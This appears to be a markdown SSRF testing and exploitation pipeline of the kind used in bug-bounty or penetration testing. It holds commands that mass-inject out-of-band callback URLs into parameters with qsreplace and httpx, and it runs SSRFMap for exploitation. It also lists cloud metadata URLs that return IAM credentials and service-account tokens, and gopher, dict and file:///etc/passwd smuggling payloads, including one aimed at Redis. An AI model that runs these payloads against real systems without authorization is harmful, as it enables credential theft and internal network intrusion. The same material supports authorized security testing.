# SSRF Detection Pipeline

> **Tip:** Use `setup_audit.sh` to generate the `target` file.

## 1. Identify Candidates
Filter URLs that might be vulnerable to SSRF (parameters taking URLs).

```bash
gf ssrf < live_urls.txt > ssrf_candidates.txt
```

## 2. Automated OOB Testing
Use tools to inject OOB payloads and check for callbacks.

```bash
# Interactsh Client (Keep running in a separate tab)
interactsh-client -o oob_interactions.txt

# QSReplace with your OOB URL
cat ssrf_candidates.txt | qsreplace "http://<your-oob-url>" | httpx -silent
```

## 3. Cloud Metadata Extraction
If running on a cloud provider, try to access metadata services.

### AWS
`http://169.254.169.254/latest/meta-data/iam/security-credentials/`

### Google Cloud (GCP)
`http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
*(Requires Header: `Metadata-Flavor: Google`)*

### Azure
`http://169.254.169.254/metadata/instance?api-version=2021-02-01`
*(Requires Header: `Metadata: true`)*

## 4. Protocol Smuggling & Wrappers
Try different schemes to bypass filters.

- **Gopher**: `gopher://127.0.0.1:6379/_...` (Redis exploitation)
- **Dict**: `dict://127.0.0.1:11211/`
- **File**: `file:///etc/passwd`
- **Redirects**: Use a domain you control to redirect to 127.0.0.1.

## 5. SSRFMap
Use SSRFMap to exploit potential SSRFs.

```bash
python3 ssrfmap.py -l ssrf_candidates.txt -t 50 --oob
```
